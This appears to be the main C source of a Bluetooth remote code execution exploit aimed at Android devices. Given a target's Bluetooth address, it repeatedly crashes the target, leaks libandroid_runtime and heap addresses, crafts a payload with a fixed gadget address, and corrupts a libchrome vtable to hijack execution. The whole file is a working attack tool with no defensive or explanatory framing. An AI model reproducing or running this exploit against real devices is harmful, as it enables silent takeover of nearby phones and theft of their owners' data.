#include "log.h"
#include "errors.h"
#include "bluetooth.h"
#include "leak.h"
#include "smash.h"

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

#include <pthread.h>
#include <unistd.h>

#define REPEAT_COUNT ((size_t)7)
#define REST_SECONDS (5)

#define PAYLOAD_CHUNK_SIZE ((size_t)512)

void payload_generator_callback(uint64_t payload_address, uint8_t *payload_data, size_t payload_data_size, void *private)
{
    LOGL_DBG_INFO("Payload address: 0x%016" PRIx64 "\n", payload_address);

    uint64_t *payload_data_64 = (uint64_t *)payload_data;
    for (size_t i = 0; i < payload_data_size / sizeof(uint64_t); i++)
        payload_data_64[i] = 0xdeadbeefbadc0dedull;

    // ldr x8, [x0] // x0 is set externally
    payload_data_64[0] = payload_address + sizeof(uint64_t); // x8's first value
    // ldr x8, [x8]
    payload_data_64[1] = 0x0000007c001ca110; // x8's second value (which we later branch to)
    // mov x1, x20
    // blr x8

    *(uint64_t *)private = payload_address;
}

err_t exploit(const char *bdaddr_str)
{
    LOGL_INFO("Exploit started...\n")

    // Create both sockets
    // int hci_sock_fd, l2cap_sock_fd;
    // int hci_sock_fd;
    // uint16_t hci_handle;
    uint8_t packet_id = 42;

    bdaddr_t bdaddr;
    ERR_FWD(bluetooth_str_to_bdaddr(bdaddr_str, &bdaddr));

    /////////////////////////////////////
    // Leak libandroid runtime address //
    /////////////////////////////////////
    uint64_t libandroid_runtime_base = 0;
    for (size_t i = 0; i < REPEAT_COUNT; i++)
    {
        LOGL_DBG_INFO("Crashing target...\n")
        ERR_FWD(smash_crash_target(bdaddr, &packet_id));

        LOGL_INFO("Leaking libandroid runtime address, attempt %zu\n", i + 1);
        err_t err = leak_libandroid_runtime_base(bdaddr, &packet_id, &libandroid_runtime_base);
        if (err)
        {
            LOGL_ERROR("Could not leak libandroid runtime address: \n")
            err_print_free(err);
            continue;
        }

        break;
    }

    if (!libandroid_runtime_base)
        ERR_RET("LEAK_LIBANDROID_RUNTIME_BASE", "Could not leak libandroid runtime address");

    LOGL_SUCCESS("Leaked libandroid runtime address: 0x%016" PRIx64 "\n", libandroid_runtime_base)

    for (size_t i = 0; i < REPEAT_COUNT; i++) // We do not have a way of verifying if we succeeded (yet), so we just repeat a few times (for now)
    {
        LOGL_INFO("RCE attempt %zu/%zu\n", i + 1, REPEAT_COUNT);

        ////////////////////////////////////////
        // Leak an address of controlled data //
        ////////////////////////////////////////
        uint64_t controlled_payload_address = 0;
        for (size_t j = 0; j < REPEAT_COUNT; j++)
        {
            LOGL_INFO("Leaking controlled payload address, attempt %zu\n", j + 1);
            err_t err = leak_controlled_payload_address(bdaddr, PAYLOAD_CHUNK_SIZE, &packet_id, payload_generator_callback, &controlled_payload_address);
            if (err)
            {
                LOGL_ERROR("Could not leak controlled payload address: \n")
                err_print(err);

                if (strcmp(err_root(err)->name, "LEAK_PATTERN_NOT_FOUND") == 0)
                {
                    LOGL_WARNING("Leak pattern was not found, crashing target to improve chances...\n")
                    ERR_FWD(smash_crash_target(bdaddr, &packet_id));
                }

                err_free(err);
                continue;
            }

            break;
            // LOGL_ERROR("Could not leak controlled payload address, crashing target to improve chances...")
        }

        if (!controlled_payload_address)
            ERR_RET("LEAK_CONTROLLED_PAYLOAD_ADDRESS", "Could not leak controlled payload address");

        LOGL_SUCCESS("Leaked controlled payload address: 0x%016" PRIx64 "\n", controlled_payload_address)

        ////////////////////////////////////////////
        // Corrupt libchrome vtable to point here //
        ////////////////////////////////////////////
        ERR_FWD(smash_corrupt_libchrome_vtable(bdaddr, &packet_id, controlled_payload_address));

        bool retry = logl_ask_yn("Do you want to retry?", false);
        if (!retry)
            break;
        if (i + 1 < REPEAT_COUNT)
        {
            LOGL_DBG_INFO("Crashing target to allow for the next try...\n")
            ERR_FWD(smash_crash_target(bdaddr, &packet_id));
        }
    }

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <bdaddr>\n", argv[0]);
        printf("Example: %s 00:11:22:33:44:55\n", argv[0]);

        return -1;
    }

    int ret = 0;

    err_t err = exploit(argv[1]);
    if (err)
    {
        err_print_free(err);
        ret = -1;
    }

    return ret;
}
